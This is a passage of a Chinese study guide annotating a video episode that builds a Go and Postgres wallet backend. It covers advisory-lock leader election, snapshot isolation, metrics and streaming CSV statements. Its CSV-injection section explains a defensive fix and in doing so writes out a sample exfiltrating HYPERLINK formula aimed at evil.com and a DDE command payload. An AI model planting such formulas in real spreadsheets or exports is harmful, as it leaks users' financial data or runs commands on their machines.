> **碰撞是"可能变慢"，魔法数字是"一定撞车（最终）"。** 前者更好。

---

## 8. 那个"每个人都会踩"的坑：锁属于连接，不是数据库

这是本集**技术含量最高的一段**，作者专门用一屏讲它。

> `[15:49:35]` **A lock belongs to one connection.** Take it through a pool — **the lock is taken on connection 3, which then goes back to the pool. Unlock through the pool, and the unlock may run on connection 7: it returns false with a warning.** **Connection 3 still holds the lock, sitting idle, for an hour, and any code that borrows it next holds the lock without knowing.**

> **译文**：**一把锁属于一条连接。** 通过连接池去拿它——**锁是在连接 3 上拿的，然后连接 3 回到池子里。通过池子去解锁，而那个解锁可能在连接 7 上执行：它返回 false 并给一个警告。** **连接 3 仍然持有那把锁，闲置在那里，一个小时，而下一个借用它的代码在不知情的情况下持有着锁。**

💡 把这个灾难画出来：

```
T0   某请求 → 从池里借到 conn#3 → pg_advisory_lock(123)
T1   请求结束 → conn#3 归还池 → 锁仍然被 conn#3 持有！
T2   对账代码 → 想解锁 → 从池里借到 conn#7 → pg_advisory_unlock(123)
                            ↑ 返回 false + WARNING: you don't own a lock of this type
T3   conn#3 闲置，但持有锁
T4   一小时后的某个转账请求 → 借到 conn#3 → 它在"持有锁"的状态下干活

结果：
  ① 解锁失败了，但没人看 WARNING
  ② 真 leader 永远拿不到锁（被别人占着）→ 对账永久停摆
  ③ conn#3 上的任何代码都"持有"那把锁 → 语义混乱
```

> `[15:49:59]` **So the Elector opens a connection of its own, with `pgx.Connect`, never from the pool, and closing that connection releases the lock.**

> **译文**：**所以 Elector 自己开一条连接，用 `pgx.Connect`，永远不从池子里拿，而关闭那条连接就会释放锁。**

```go
// Not a connection from the pool: the pool would hand our session, and
// the lock with it, to whoever asks next.
conn, err := pgx.Connect(ctx, e.dsn)
...
defer conn.Close(context.WithoutCancel(ctx))     // ← 关闭 = 结束会话 = 释放锁
```

💡 这个注释是本集写得最好的一段代码注释。**它解释了"为什么不用池"，而不是"用了什么"。**

> **注释应该解释"为什么不是显而易见的那个选择"。** "我们用了 `pgx.Connect`" 是显然的；"我们**没有**用池，因为池会把我们的会话交给下一个人" 是**需要被传承的知识**。

### 还有 pgbouncer 的坑

> `[15:50:14]` **the same goes for pgbouncer in transaction mode: sessions are shared there too, so the Elector must connect to Postgres directly.**

> **译文**：**`pgbouncer` 的 transaction 模式也一样：那里会话也是被共享的，所以 Elector 必须直连 Postgres。**

💡 三种 pooler 模式，只有一种安全：

| pgbouncer 模式 | 一条客户端连接映射到 | advisory lock 安全？ |
|---|---|---|
| **session** | 一条固定的服务端连接 | ✅ |
| **transaction** | 每个事务换一条服务端连接 | ❌ **锁会飘走** |
| **statement** | 每条语句换 | ❌ 立刻飘走 |

> **这是一个"基础设施配置悄悄破坏了应用正确性"的经典案例。** 应用代码完全正确，但**部署时加了一个 pgbouncer**，于是 advisory lock 全失效。
>
> 这类问题**只在生产环境出现**（开发环境没 pgbouncer），而且**症状是"有时两个 leader"**——极难排查。

**防御方式**：Elector **绕过 pooler 直连**，也就是说它的 `dsn` 是**数据库地址**，不是 pooler 地址。

> `[15:51:17]` ...**Elector has the database's address, not the pool, on purpose, as we just saw.**

> **译文**：……**Elector 拿的是数据库的地址，不是池子的地址——正如我们刚看到的，这是故意的。**

💡 用**配置的类型**来表达这个区别（`dsn string` 而不是 `pool *pgxpool.Pool`）是**类型级防护**：

```go
func NewElector(dsn, lock string, logger *slog.Logger) *Elector    // ✅ 只能拿 dsn
func NewElector(pool *pgxpool.Pool, lock string, ...) *Elector    // ❌ 拿了池就一定会误用
```

**如果你给了它一个池，它就会用池。** 所以**不给**。

---

## 9. 两个 leader 的那几秒，以及 defer 的精确顺序

```go
func (e *Elector) campaign(ctx context.Context, lead func(context.Context)) error {
	conn, err := pgx.Connect(ctx, e.dsn)
	...
	defer conn.Close(context.WithoutCancel(ctx))
	...
	if _, err := conn.Exec(ctx, "SELECT pg_advisory_lock(hashtext($1))", e.lock); err != nil {
		return err
	}
	leading.Set(1)
	defer leading.Set(0)

	// Deferred calls run last first: stop the jobs, wait for them, and only
	// then let the lock go. Two leaders never run jobs at the same time.
	ctx, cancel := context.WithCancel(ctx)
	var wg sync.WaitGroup
	wg.Go(func() { lead(ctx) })
	defer wg.Wait()
	defer cancel()

	for {
		select {
		case <-ctx.Done():
			return nil
		case <-time.After(e.Retry):
		}
		if err := ping(ctx, conn, e.Retry); err != nil {
			return fmt.Errorf("lost the session, and the lock: %w", err)
		}
	}
}
```

> `[15:53:10]` **Deferred calls run last first, so we cancel the jobs, wait for them to stop, and only then close the connection and let the lock go.** **The next leader never starts while our jobs are still running.**

> **译文**：**deferred 调用按后进先出执行，所以我们先取消任务、等它们停下，然后才关闭连接、放掉锁。** **下一个 leader 永远不会在我们的任务还在跑的时候开始。**

💡 **`defer` 的栈顺序**在这里是**正确性的核心**：

```go
defer conn.Close(...)      // 第 1 个注册 → 最后执行
defer leading.Set(0)       // 第 2 个注册
defer wg.Wait()            // 第 3 个注册
defer cancel()             // 第 4 个注册 → 最先执行
```

**出栈顺序**：

```
① cancel()        → lead 的 ctx 被取消 → Runner 停止
② wg.Wait()       → 等 Runner 真的停下
③ leading.Set(0)  → 指标归零
④ conn.Close()    → 会话结束 → Postgres 释放锁
```

**如果顺序反了**（比如把 `defer conn.Close` 放在最后注册）：

```
① conn.Close()    → 会话结束，锁释放
② 下一个副本立刻拿到锁，开始跑
③ 我们的 Runner 还在跑  ← 两个 leader 同时跑！
```

> **这一段的存在理由就是"defer 顺序 = 正确性"。** 而作者用了一条注释把它钉住：
>
> `// Deferred calls run last first: stop the jobs, wait for them, and only then let the lock go.`
>
> **一行注释防住了一个未来的重构。**

### "两个 leader"的窗口是存在的

> `[15:50:29]` ...**between losing the session and noticing, a few seconds can pass where two replicas both think they lead.**

> **译文**：……**在失去会话和发现之间，可能过去几秒，而在那几秒里两个副本都认为自己才是 leader。**

💡 场景是**网络分区**（不是崩溃）：

```
时刻 T0  leader A 的会话还活着（在 Postgres 看来）
时刻 T1  A 和 Postgres 之间的网络断了
时刻 T2  Postgres 认为会话超时，释放锁 → B 拿到锁 → B 开始跑
时刻 T3  A 还没发现自己的连接断了（ping 每 5 秒一次）
         A 仍然以为自己持有锁 → A 也跑
         → 这就是"两个 leader"的几秒
```

**三个东西把这窗口的影响限制住了**：

| 机制 | 作用 |
|---|---|
| `datestyle`... 不对，是 `Retry = 5s` | **缩短窗口**（5 秒内 ping 一次） |
| `UNIQUE (job, slot)` | **即使双跑，第二个的 INSERT 失败** |
| **任务只读** | 即使真的都跑了，**只是多读一次** |

> **这就是为什么"fencing token"在这里不需要**：三层里有两层是硬的，而最坏后果是"多一次读"。
>
> **但如果任务会改账，最坏后果是"改两次"**——那时就必须要 fencing token 了。

### `jobs_leader` 指标：和必须恰好是 1

> `[15:51:01]` ...**a gauge, `jobs_leader`: 1 while this replica leads. Summed over every replica, it should always be exactly one. Zero means nobody runs the jobs, and two means something is badly wrong. Both are worth an alert.**

> **译文**：……一个 gauge，`jobs_leader`：这个副本当 leader 时是 1。在所有副本上求和，它应该**永远是恰好 1**。**0 表示没有人在跑这些任务，2 表示有什么东西严重不对。两个都值得一条告警。**

💡 这是一个**漂亮的单指标断言**，值得记住它的形状：

```promql
sum(jobs_leader) != 1        # 告警
```

| 值 | 含义 | 后果 |
|---|---|---|
| **0** | 没有 leader | 任务不跑（**静默失效**！） |
| **1** | 正常 | — |
| **2** | 选主坏了 / 网络分区 | 双跑（被 `UNIQUE` 挡住，但状态异常） |

> **一般的健康指标是"值在某个范围内"，而这个是"和恰好等于一个常数"。** 后者强得多——因为它**同时抓住了"太少"和"太多"**。
>
> **凡是"应该有且只有一个"的东西，都该有一个这样的指标**（leader、活跃迁移锁、某个单例 consumer）。

而 `leading.Set(1)` / `defer leading.Set(0)` 的位置也讲究：**在拿到锁之后、启动任务之前**设 1，**在任务停下之后**设 0。

---

## 10. 快照：为什么必须是 `REPEATABLE READ`

> `[15:58:20]` **`snapshot` is a read-only transaction at repeatable read: every query in it sees the database exactly as it was when it began.** **That's essential here**: without it, **the holds check could read the holds account, then a transfer commits a new hold, then it reads the holds table — and we'd report a discrepancy that never existed.**

> **译文**：**`snapshot` 是一个 repeatable read 级别的只读事务：它里面的每条查询看到的数据库都是它开始时的那一刻的样子。** **这在这里是本质性的**：没有它，**holds 检查可能先读 holds 账户，然后一笔转账提交了一个新 hold，然后它再读 holds 表——于是我们报出一个从未存在过的差异。**

```go
var snapshot = pgx.TxOptions{IsoLevel: pgx.RepeatableRead, AccessMode: pgx.ReadOnly}
```

💡 这个例子极其具体，值得画出来：

```
holds 检查的逻辑：账户余额 == 未完成 hold 之和

没有快照（READ COMMITTED，每条语句一个快照）：
  t1: 读 holds 账户余额        → 100
  t2: 【一笔转账提交】          → 账户 110，holds 表多一条
  t3: 读未完成 hold 之和        → 110
  结果：100 ≠ 110 → 报一个不存在的差异 ❌

有快照（REPEATABLE READ，整个事务一个快照）：
  t1: 读余额    → 100   （快照建立于 t0）
  t2: 【提交】  → 对我不存在
  t3: 读 hold   → 100
  结果：100 == 100 ✅
```

💡 **这是"对账必须在时间点上一致"的必然要求**，而它有个更普适的名字：

> **对账 = 在同一个时间点上，取多个量并比较。**
>
> 如果这些量来自**不同的时间点**，那么"不一致"可能只是**时间差**，而不是**数据错误**。

**所以对账的每一步都必须在同一个快照里。** 而 `REPEATABLE READ` 就是"冻结时间"的那个机制。

> `[16:02:22]` ...**and in the full suite, it runs in parallel with every other wallet test, payments under load included, without a single false alarm. That's the snapshot doing its job.**

> **译文**：……**而在整个测试套件里，它和其他所有 wallet 测试并行跑，包括在负载下跑支付，没有一次误报。那就是快照在起作用。**

💡 这句是对**"为什么这个属性重要"**的最强证明：**测试是并发的**，所以每一毫秒都有转账在提交。如果没有快照，对账测试会**随机失败**——而随机的测试失败会被当成"flaky"，然后被忽略。

> **"没有一次误报"是这里最值得注意的词。** 一个会误报的对账系统，比没有对账系统更糟——因为**人会开始忽略它**。
>
> **告警疲劳（alert fatigue）是对账系统的头号杀手。**

### 只读 + 可选复用调用者事务

```go
func (s *Store) Reconcile(ctx context.Context) (Reconciliation, error) {
	tx := s.tx                    // 如果 store 已经在一个事务里（测试用）
	if tx == nil {
		var err error
		if tx, err = s.pool.BeginTx(ctx, snapshot); err != nil { ... }
		defer tx.Rollback(ctx)
	}
	...
}
```

> `[15:58:55]` **`Reconcile` begins one — unless the store already runs in a caller's transaction, which our test will use.**

> **译文**：**`Reconcile` 自己开一个——除非这个 store 已经跑在调用方的事务里，我们的测试会用到这一点。**

💡 这个 `if s.tx == nil` 是**EP07 的 `WithTx` 在本集的复用**：

```
生产路径：Reconcile()         → 自己开 REPEATABLE READ 快照
测试路径：store.WithTx(tx).Reconcile()  → 用测试的事务
```

**为什么测试要这个？** 因为测试要**故意破坏账本，然后检查对账能不能发现它**，而**不能污染其他测试**：

```go
// reconcile_test.go 的形状
tx := pool.Begin()
defer tx.Rollback(ctx)              // ← 结束就回滚，谁也不会看到破坏
// 在这个事务里：关掉触发器、改一笔分录、跑对账、断言两条 discrepancy
```

> **"在一个永远回滚的事务里做破坏"** 是测试写操作型逻辑的**最干净的方式**——比"改完再改回来"可靠得多（改回来的代码本身可能有 bug）。

---

## 11. JSON 里的 `[]` 和 `null`：一个会让指标崩掉的差别

```go
r := Reconciliation{Checks: len(checks), Discrepancies: []Discrepancy{}}   // ← 注意
```

> `[15:59:25]` **the slice starts empty, not nil, so the JSON says an empty list rather than null — which matters for the metric in a moment.**

> **译文**：**这个 slice 初始化成空而不是 nil，所以 JSON 说的是一个空列表而不是 null——这在等一下的指标里很重要。**

💡 这是 Go 里一个**极其常见的坑**：

```go
var s []T                 // nil → JSON: null
s := []T{}                // 空 → JSON: []
```

而我们存的 summary 是 `jsonb`，然后**指标**是这样读的：

```go
pool.QueryRow(ctx, `SELECT jsonb_array_length(summary->'discrepancies')::float8
	FROM job_runs WHERE job = 'reconcile' AND status = 'succeeded'
	ORDER BY slot DESC LIMIT 1`).Scan(&n)
```

**如果 `discrepancies` 是 `null`**：

```sql
SELECT jsonb_array_length('null'::jsonb);
-- ERROR: cannot get array length of a scalar
```

> **指标会永远报 error（在我们的代码里变成 `NaN`）。** 而这正是"账本干净"的时刻——**最好的情况下指标坏掉。**

💡 这个坑的通用形态：

> **"空集合"和"不存在的集合"在 JSON 里是两个东西（`[]` vs `null`），而几乎所有消费方只处理其中一个。**
>
> 在 API 响应里也一样（EP05 的 `entries: []` 而不是 `null`）——那里的理由是可以无条件循环，这里的理由是 `jsonb_array_length`。
>
> **同一个规则（空集合序列化成 `[]`）在两个地方各救了一次。**

---

## 12. 指标：为什么用 `GaugeFunc` 而不是 `Set`

> `[15:59:56]` ...**and the metric is a subtle one**: **if the leader set a gauge after each run, a replica that used to lead would keep reporting its last value forever**. **After a fix, the old leader would still say 2, and the alert would never clear.**

> **译文**：……**而这个指标很微妙**：**如果 leader 在每次运行后设置一个 gauge，一个曾经当过 leader 的副本会永远报它最后那个值**。**修好之后，那个旧 leader 仍然会说 2，于是告警永远清不掉。**

💡 这是**Prometheus gauge 的经典陷阱**，值得完整理解：

```
每个副本暴露自己的 metric → Prometheus 抓取所有副本 → 求和

如果 metric 是"上次运行结果"（存储值）：
  replica A（旧 leader）: reconciliation_discrepancies = 2   ← 再也不更新
  replica B（新 leader）: reconciliation_discrepancies = 0
  求和 = 2  →  告警永远红着，即使已经修好 ❌
```

> `[16:00:28]` **so like the outbox lag from episode 14, this gauge is a function that reads the state.**

> **译文**：所以**像第 14 集的 outbox 延迟一样，这个 gauge 是一个读取状态的函数。**

```go
func RegisterMetrics(pool *pgxpool.Pool) {
	promauto.NewGaugeFunc(prometheus.GaugeOpts{
		Name: "reconciliation_discrepancies",
	}, func() float64 {
		var n float64
		err := pool.QueryRow(ctx, `SELECT jsonb_array_length(summary->'discrepancies')
			FROM job_runs WHERE job = 'reconcile' AND status = 'succeeded'
			ORDER BY slot DESC LIMIT 1`).Scan(&n)
		if err != nil {
			return math.NaN()
		}
		return n
	})
}
```

💡 `GaugeFunc` **在每次抓取时执行**。所以：

```
每个副本都在读"最新一次成功运行"的结果（从共享的数据库）
  → 所有副本报同一个值  → 求和会变成 N 倍？
```

**等等——求和会变 N 倍吗？** 会。这是一个**需要小心的地方**：

| 如果查询是 `max(...)` 或 `sum(...)` | 如果查询是 `promql sum()` |
|---|---|
| 每个副本返回同一个值 | 求和 = N × 值 |

**所以这个指标的正确用法是 `max()` 而不是 `sum()`**（或者让每个副本都返回同一个值，然后用 `max`）。而 `jobs_leader` 恰恰相反——它**必须用 sum**（因为每副本的值不同，加起来正好是 1）。

> **这就是为什么 `jobs_leader` 用 `Gauge`（每副本状态不同），而 `reconciliation_discrepancies` 用 `GaugeFunc`（每副本状态相同）。**
>
> **一个指标该怎么聚合，取决于"它是哪个对象的状态"**：
> - "**这个副本**是不是 leader" → **sum**（按副本）
> - "**这个系统**最后对账发现了几个问题" → **max**（按系统）

### `NaN` 而不是 0

```go
if err != nil {
	return math.NaN() // unknown, which isn't zero
}
```

> `[16:00:13]` ...**that's why... `math.NaN()` — unknown, which isn't zero.**

> **译文**：……**所以返回 `math.NaN()`——"未知"，而未知不等于零。**

💡 这条注释值得单独记住：**"我不知道"和"零"是两个不同的东西。**

```
返回 0     → 告警系统认为"没有问题" → 读者以为账本干净（但其实查询失败了）
返回 NaN   → Prometheus 保留 NaN → 图表断开 → 告警规则能看到"没有数据"
```

> **可观测性系统的头号谎言是"用 0 表示不知道"。** 它会让你在系统已经瞎了的时候以为一切正常。
>
> **这就是 §7 那句 "a check that silently stops running looks exactly like a ledger that's fine" 的指标版本。**

---

## 13. 报表一：客户对账单（CSV 流式）

> `[16:04:28]` **now reporting, starting with something customers ask for: a statement, as a CSV file, for any range of days.** `GET /v1/wallets/{id}/statement?from=...&to=...` — **done properly, it has a few properties.**

> **译文**：现在说报表，从客户会要的东西开始：**一份对账单，作为 CSV 文件，任意日期范围。** `GET /v1/wallets/{id}/statement?...`——**做对的话，它有几个性质。**

作者列了**六个性质**，每个都是一个坑：

| # | 性质 | 不做会怎样 |
|---|---|---|
| 1 | **流式，500 条一页，keyset** | 一年 10 万条 → 全在内存 |
| 2 | **一个快照** | 边读边变 → 余额加不上 |
| 3 | **按币种格式化** | 1500 日元显示成 15.00 |
| 4 | **是文件，不是网页** | 浏览器里打开成一团 |
| 5 | **失败要 abort 连接** | 客户端拿到"看起来完整"的短文件 |
| 6 | **防 CSV 注入** | 财务的 Excel 执行了用户写的公式 |

### 性质 1：流式

> `[16:04:44]` **it streams 500 entries at a time, with keyset pagination, so a year of entries takes no more memory than one page.**

> **译文**：**它一次流 500 条，用 keyset 分页，所以一年的分录占的内存不比一页多。**

```sql
-- name: StatementPage :many
SELECT e.id, e.created_at, e.transaction_id, t.description, e.direction, e.amount
FROM entries e JOIN transactions t ON t.id = e.transaction_id
WHERE e.account_id = @account_id
  AND e.created_at >= @since AND e.created_at < @until
  AND e.id > @after_id              -- ← keyset
ORDER BY e.id
LIMIT @page_size;
```

> `[16:08:31]` ...**the database seeks straight to the next page, with the index on `account_id` and `id`, so the last page is as fast as the first.**

> **译文**：……**数据库直接 seek 到下一页，用 `account_id` 和 `id` 上的索引，所以最后一页和第一页一样快。**

💡 **`account_id, id` 上的索引是 EP05 建的**，为了 `entries` 端点的 keyset 分页（`WHERE account_id = ... AND id < ...`）。

**现在它服务的是 `id > after_id ORDER BY id`**——注意方向是**反的**（EP05 是最新在前，这里是时间顺序）。

**同一个索引能服务两个方向**（Postgres 的 B-tree 可以正着扫也可以倒着扫）。**所以 EP05 那一行 `CREATE INDEX` 在 15 集之后又付了一次利息。**

### 性质 2：一个快照

> `[16:04:44]` **it's one snapshot, though — the opening balance and every page see the same moment — and the balances add up even while new payments arrive.**

> **译文**：**它是一个快照——期初余额和每一页看到的是同一个时刻——所以即使在新支付不断到来的时候，余额也是加得起来的。**

💡 这条和 §10 是**同一个技术，两个后果**：

| 用途 | 如果没有快照 |
|---|---|
| 对账 | **误报差异** |
| 对账单 | **余额错乱**（第 3 页的期初余额对不上第 2 页的期末） |

**具体会怎么错**：

```
第 1 页读完，running balance = 500
【一笔转账提交：+25】
第 2 页读到这笔新转账  →  running balance = 525
但客户看到第 1 页末尾是 500，第 2 页却从 500 开始又加了 25（本来该是 525 起）
→ CSV 里的"balance"列 自相矛盾
```

> **客户会拿着这份 CSV 来找你对账。** 所以"一个快照"不是优化，是**财务文件的基本要求**。

### 性质 3：按币种格式化

> `[16:05:03]` ...**money is formatted per currency: 1500 cents is 15 dollars, but 1500 yen is 1500 yen, and 1500 fils is one and a half Kuwaiti dinars, using the exponent table from episode 18.**

> **译文**：……**钱按币种格式化：1500 分是 15 美元，但 1500 日元就是 1500 日元，而 1500 费尔是一个半科威特第纳尔，用的是第 18 集那张 exponent 表。**

```go
// internal/fx/convert.go（EP20 新增）
func Format(amount int64, currency string) (string, error) {
	// 取 exponent；未知币种 → error
	// 整数部分 + 小数点 + 补零的小数部分
}
```

> `[16:07:41]` ...**format works on the digits, never on floats**: format the integer, take the sign off, and if the currency has no minor unit, like the yen, that's it; otherwise **pad with zeros, so five cents becomes `0.05`**, and **put the decimal point before the last exponent digits**. **An unknown currency is an error — a guess about money is worse than no answer.**

> **译文**：……**format 操作的是数字位，绝不是浮点**：格式化整数、把符号拿掉，如果这种货币没有最小单位——比如日元——那就完了；否则**补零，于是五分变成 `0.05`**，然后**把小数点放在最后 exponent 位数字之前**。**未知币种是一个错误——关于钱的猜测比没有答案更糟。**

💡 "**a guess about money is worse than no answer**" 是本集**第二次**出现"宁可不给答案"（第一次是 §12 的 `NaN`）。

**这两个决定是同一个价值观**：

| 场景 | 错误做法 | 我们的做法 |
|---|---|---|
| 指标查询失败 | 返回 0（"没问题"） | **`NaN`**（"不知道"） |
| 未知币种格式化 | 当作 2 位小数（"差不多"） | **error**（"不知道"） |

> **系统在"不知道"的时候，必须能说出来。** 一旦它开始猜，它就变成了一个**会撒谎**的系统。

### 性质 4：是文件，不是网页

```go
w.Header().Set("Content-Type", "text/csv; charset=utf-8")
w.Header().Set("Content-Disposition", `attachment; filename="statement-<id>.csv"`)
w.Header().Set("Cache-Control", "no-store")     // ← 这是某人的钱
```

> `[16:05:22]` ...**a CSV content type, a content disposition that names the file, and no-store, since this is someone's money.**

> **译文**：……**一个 CSV 的 content type、一个给文件命名的 content disposition，以及 `no-store`，因为这是某个人的钱。**

💡 `no-store` 的理由值得说清：**对账单里有全部交易记录**。如果它被 CDN / 浏览器缓存：

```
① 用户在公共电脑上下载 → 下一个人可以在缓存里看到
② 中间代理缓存 → 别人的请求命中同一份
③ 用户登出后，浏览器后退 → 仍然能拿到
```

> **凡是"按用户隔离的敏感数据"，都必须 `no-store`。** 而这和"性能优化"是**直接冲突**的——你不能缓存它。
>
> **这是一个"安全比性能优先"的明确场合**，而代码里只有一行。

### 性质 5：失败要 abort，不能给"短文件"

> `[16:05:38]` **and if it fails halfway, the status has already gone out with the first line, so we abort the connection. The client sees a broken download, never a short file that looks complete.**

> **译文**：**而如果它中途失败，状态码已经随第一行字节发出去了，所以我们中断这条连接。客户端看到一个损坏的下载，而永远不是一个看起来完整的短文件。**

💡 这是**流式响应的根本困境**：

```
200 OK 已经发出（因为第一行 CSV 已经写了）
  ↓
第 3000 行时数据库断了
  ↓
你不能改成 500 了 —— HTTP 状态码已经发出去了
```

**两个选择**：

| 选择 | 客户端看到 | 后果 |
|---|---|---|
| **优雅结束** | 一个"正常"的 CSV，但少了一半 | **财务会用它做报表，数字是错的** ❌ |
| **abort 连接** | 下载失败 / 文件截断 | 客户端会重试 ✅ |

```go
func abort(w http.ResponseWriter, logger *slog.Logger, err error) {
	logger.Error("statement", "err", err)
	panic(http.ErrAbortHandler)      // 让 net/http 直接切断连接
}
```

> `[16:14:39]` ...`abort` **logs it, and panics with `http.ErrAbortHandler` — which our recover middleware from episode 4 lets through on purpose** — **the server cuts the connection without the final chunk, and the download fails visibly.**

> **译文**：……`abort` **记日志，然后用 `http.ErrAbortHandler` panic——我们第 4 集的 recover 中间件故意放过它**——**服务器切断连接、不发最后那个 chunk，于是下载明显地失败。**

💡 这里有一个**跨 16 集的呼应**：

```
EP04 的 Recover 中间件：
    recover() → 记日志 → 500
    但要从 panic 里"透传" http.ErrAbortHandler（标准库的约定）
```

**如果 EP04 的 Recover 没有透传它**，那么：

```go
panic(http.ErrAbortHandler)
  → Recover 捕获
  → 试图写 500  →  但 header 已经发出去了
  → "superfluous WriteHeader call"  + 客户端收到一个"完整"的截断文件 ❌
```

> **标准库用 panic 表达"中止这个响应"，是一个奇怪但有效的设计**（因为 panic 是唯一能"跳过所有后续代码"的方式）。
>
> **而你的 recover 中间件必须知道这个约定。** 这是一个**很容易漏、但一旦漏了就悄悄出错**的地方。

`[16:14:24]` 还有那个 `Flush` 的细节：

> `[16:14:24]` **at the end, flush, and check the writer's error, since a CSV writer buffers, and its last write might be the one that fails.**

> **译文**：**最后 flush，并检查 writer 的错误，因为 CSV writer 会缓冲，而它最后一次写可能正是失败的那次。**

💡 `encoding/csv.Writer` 内部有 `bufio`。所以：

```
csv.Write(...) × 1000   → 全都进了缓冲区（err == nil）
w.Flush()               → 真正写出去 ← 错误在这里才出现
w.Error()               → 检查
```

**不检查 `Flush` 之后的状态，等于不检查最后 4KB 有没有写出去。** 而 **4KB 正好是一批分录**。

### 性质 6：CSV 注入

> `[16:05:56]` **and one more thing that's easy to miss: CSV injection.** **A CSV file is just text, but people open it in a spreadsheet.** **If a cell starts with an equal sign, a plus, a minus, an at sign, or a tab or a carriage return, the spreadsheet treats it as a formula.**

> **译文**：**还有一件容易被忘掉的事：CSV 注入。** **CSV 文件只是文本，但人们会用电子表格打开它。** **如果一个单元格以等号、加号、减号、@ 符号、制表符或回车开头，电子表格会把它当成公式。**

> `[16:06:32]` **a hyperlink formula can send other cells to someone else's server with a click, and older spreadsheets would even run commands.** **The fix, from OWASP's guidance, is to put a single quote in front of such a cell: the spreadsheet shows it as text and runs nothing.**

> **译文**：**一个超链接公式可以让人一点击就把其他单元格发到别人的服务器，而更老的电子表格甚至会执行命令。** **修法来自 OWASP 的指南：在这个单元格前面加一个单引号——电子表格会把它当成文本显示，什么也不执行。**

```go
func cell(s string) string {
	if s != "" && strings.ContainsRune("=+-@\t\r", rune(s[0])) {
		return "'" + s
	}
	return s
}
```

💡 这个攻击是**从"服务端"到"财务的笔记本"的横向移动**：

```csv
date,description,amount
2026-01-05,=HYPERLINK("https://evil.com/?d="&A2&B2),-25.00
```

**财务打开这个文件** → Excel 执行 `HYPERLINK` → **把这一行的日期和金额发到 evil.com**。

> 更老的 Excel 有 `=cmd|'/c calc'!A0` 这种 **DDE** 执行方式（已修补，但同类问题层出）。

**四个细节，每个都是对的地方**：

**① 只处理"第一个字符"**

> `[16:17:40]` ...**but an equal sign in the middle of the text is harmless, and stays exactly as it is. We guard the start of a cell, and nothing else.**

> **译文**：……但**一个等号在文本中间是无害的，它保持原样。我们只守卫单元格的开头，别的都不动。**

**② 只处理文本，不处理金额**

> `[16:06:52]` ...**but only for text. Our amounts come from our own code, and minus 25 dollars has to stay a number that finance can add up.**

> **译文**：……但**只对文本**。**我们的金额来自我们自己的代码，而负 25 美元必须保持成一个财务能加总的数字。**

💡 这是一个**关键的不对称**，很容易写错：

```go
// ❌ 对所有列都用 cell()
[]string{date, cell(desc), cell(amount), cell(balance), currency, id}
//                                  ^^^^^^^^^^^^ "-25.00" 变成 "'-25.00"
//                                  → Excel 里它是文本，sum() 算不了

// ✅ 只对描述用
[]string{date, cell(desc), amount, balance, currency, id}
```

> **金额是我们生成的**（`fx.Format` 的输出），**它不可能包含用户输入**，所以它不需要防护。而**加了防护反而破坏了它的用途**。
>
> **"防护"和"功能性"在这里是冲突的，而正确解是"防护该防护的地方"。**

**③ 现在还没有用户输入，但快有了**

> `[16:07:10]` **today every description in the ledger is ours, but a memo field on transfers is one feature request away, so the statement is guarded by design.**

> **译文**：**今天账本里的每一条描述都是我们自己的话，但转账上的一个 memo 字段只差一个功能请求，所以对账单在设计上就守住了。**

💡 这句话背后是**一个具体的判断**：

```
现在:  description 是 "hold captured" 之类的常量 → 没有注入风险
将来:  description 可能包含用户填的 memo     → 立刻有风险
```

**而"将来"只差一个功能请求。** 所以现在就把 `cell()` 写进去——**成本 4 行，收益是"那个功能请求不会变成安全事件"。**

> **安全措施的最佳时机是"在还没有攻击面的时候"**——因为那时它**不影响任何人**，不会被"性能"或"兼容性"否决。

**④ 那六个字符**

```
=  +  -  @  \t  \r
```

| 字符 | 为什么危险 |
|---|---|
| `=` | 公式 |
| `+` | 公式（`+1+1` 会被求值） |
| `-` | 公式 |
| `@` | 老版 Excel 的函数调用 |
| `\t` | **可能让 Excel 认为下一段是新的单元格/公式** |
| `\r` | **同上，且能绕过只检查开头一行的防护** |

💡 `+` 这一条有个副作用值得注意：**一个以 `+` 开头的电话号码**（国际格式）会被加上引号。测试里明确验了：

> `[16:17:25]` ...**a hyperlink formula gets its quote, so does a phone number that starts with a plus, something that starts with a minus, an at sign, and a tab.**

> **译文**：……**一个超链接公式会拿到它的引号，一个以加号开头的电话号码也会**，以减号开头的、@ 符号开头的、制表符开头的也一样。

> **这就是安全的代价：有些合法的文本也会被加上引号。** 而这是**可以接受**的——Excel 里 `'+1234567890` 显示成 `+1234567890`，只是内部存成文本。

---

## 14. `iter.Seq2`：让数据库不出现在 HTTP 层

```go
func (s *Store) Statement(
	ctx context.Context, acc Account, since, until time.Time,
) iter.Seq2[StatementLine, error] {
	return func(yield func(StatementLine, error) bool) {
		tx, err := s.pool.BeginTx(ctx, snapshot)
		...
		defer tx.Rollback(ctx)
		...
		for {
			page, err := q.StatementPage(...)
			...
			for _, e := range page {
				line := ...
				if !yield(line, nil) {       // ← 调用方提前退出
					return
				}
			}
			if len(page) < statementPage {   // ← 短页 = 最后一页
				return
			}
		}
	}
}
```

> `[16:10:40]` ...**returns an iterator, `iter.Seq2` of lines and errors — the range-over-function feature from Go 1.23.** **The caller ranges over it like a slice, and the pages are fetched as it goes**, though **nothing is held beyond one page**.

> **译文**：……**返回一个迭代器，`iter.Seq2`，行和错误——Go 1.23 的 range-over-function 特性。** **调用方像遍历切片一样遍历它，而页是随着遍历取的**，尽管**除了当前一页之外什么都不保留**。

> `[16:10:57]` **an iterator also keeps the database out of the HTTP code: the handler never sees a transaction or a query.**

> **译文**：**迭代器还把数据库挡在 HTTP 代码之外：handler 从来没看见过一个事务或者一条查询。**

💡 这是**分层原则**在流式场景下的具体实现，值得对比三种写法：

```go
// ❌ 写法 1：把所有行读进内存
lines, err := store.Statement(ctx, acc, since, until)     // []StatementLine
// 一年 10 万条 × 每条 6 个字段 → 几十 MB，而且必须先读完才能开始写响应

// ❌ 写法 2：把事务暴露给 handler
tx := pool.Begin()
q := db.New(tx)
for { page := q.StatementPage(...) ; w.Write(...) }       // handler 里有 SQL

// ✅ 写法 3：迭代器
for line, err := range store.Statement(ctx, acc, since, until) {
	if err != nil { ... }
	w.Write(line.Record())
}
```

**迭代器让"内存 O(1)"和"分层干净"同时成立**，而这是**以前做不到的组合**（以前只能用回调函数，代码形状很丑）。

> `[16:11:45]` **if the caller stops early, `yield` returns false, and we must stop too**, and **the deferred rollback ends the snapshot.**

> **译文**：**如果调用方提前停下，`yield` 返回 false，而我们也必须停下**，然后 **defer 的 rollback 结束这个快照。**

💡 `yield` 返回 `false` 的场景：

```
客户端下载到一半断线 → w.Write 失败 → handler 停止 range → yield 返回 false
  → Store 的循环 return
  → defer tx.Rollback()  → 快照结束，连接归还
```

